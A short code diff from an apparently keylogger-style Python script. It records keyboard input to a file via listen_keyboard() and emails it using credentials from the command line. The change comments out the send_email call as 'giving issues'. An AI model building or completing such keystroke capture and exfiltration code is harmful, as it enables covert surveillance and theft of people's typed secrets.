@@ -4,5 +4,7 @@ import sys
 
 email, password = sys.argv[1:]
 
-filename = listen_keyboard()
-send_email(email, password, filename)
+filepath = listen_keyboard()
+
+# giving issues
+# send_email(email, password, filepath)
